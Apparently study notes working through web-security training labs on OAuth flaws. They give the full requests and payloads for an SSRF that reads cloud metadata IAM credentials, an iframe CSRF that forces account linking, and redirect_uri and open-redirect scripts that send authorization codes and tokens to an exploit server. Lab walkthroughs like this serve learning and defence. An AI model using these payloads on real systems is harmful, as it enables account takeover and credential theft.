**

- Arises at Sign-in page. The main request to play with is /auth?client_id=...
    
- SSRF via OpenID dynamic client registration - Study the authorization workflow and navigate to https://oauth_id.oauth-server.net/.well-known/openid-configuration
    

See that it is possible to register your own application at the /reg endpoint

In Repeater, create a POST /reg request:

  

POST /reg HTTP/2

Host: oauth_id.oauth-server.net

Content-Type: application/json

Content-Length: 158

  

{

"redirect_uris": [

        "https://example.com"

        ],

 "logo_uri" : "http://collaborator_id.com/"

}

  

Send the GET /client/client_id/logo to the repeater and paste in the client_id from the previous request.

If this polls the collaborator, it means it works

  

Replace the collaborator_id with http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ 

Send the request to obtain the secret access key

  

- Forced OAuth profile linking -  Complete login process on Burpbrowser to examine login and authorization process. The GET /auth?client_id... endpoint sends the authorization code to the /oauth-linking endpoint via the redirection_uri. There is no state parameter so this is vulnerable to CSRF attacks.
    

Turn on Intercept and Attach social profile, forward requests until GET /oauth-linking?code= and copy URL, drop the request so the code is not used. Log out of website.

Create a malicious payload on the exploit server, .e.g.:

<iframe src="https://lab_id.web-security-academy.net/oauth-linking?code=code"></iframe> 

When the victim's browser loads the iframe, it will attach their account with your social media profile. 

Login using social media profile to access the admin panel.

- OAuth account hijacking via redirect_uri - Log in with Social media on Burpbrowser and study the Oauth process.
    

There is a GET auth?client_id=&redirect_uri=...

endpoint, and the redirect_uri is where the access code token will be sent to, as can be seen in a few requests later when there is a request to: GET /oauth-callback?code=5sTagmFjLBWJvzVlCxok06IAYTiw1Y8pZt_zX-gMRD6 HTTP/2

Host: lab_id.web-security-academy.net

  

Craft a payload in the exploit server to steal the code


\<iframe src="https://oauth_id.oauth-server.net/auth?client_id=client_id&redirect_uri=https://exploit_id.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email">
\</iframe>


  

Deliver to victim to steal the code and access 

[https://lab_id.web-security-academy.net/oauth-callback?code=stolen_code](https://lab_id.web-security-academy.net/oauth-callback?code=stolen_code)

- Stealing OAuth access tokens via an open redirect - In the GET /auth?client_id=jxd366l7ffav3gvuqp6fy&redirect_uri=... request, the redirect_uri is validated against a whitelist, but can be bypassed using path traversal. 
    

Find that there is an open redirect in the next post function in every blog post

https://lab_id.web-security-academy.net/post/next?path=/post?postId=10

Intercept social login to steal the request to use in crafing exploit.

Craft an exploit to steal the authorization code:

<script>

if (!document.location.hash) { 

    window.location = 'https://oauth_id.oauth-server.net/auth?client_id=client_id&redirect_uri=https://lab_id.web-security-academy.net/oauth-callback/../post/next?path=https://exploit_id.exploit-server.net/exploit/&response_type=token&nonce=nonce&scope=openid%20profile%20email'

}

else {

    window.location = '/?'+document.location.hash.substr(1)

}

  

</script>

  

Access log to steal the Bearer token and use it to steal the API key in GET /me request

**

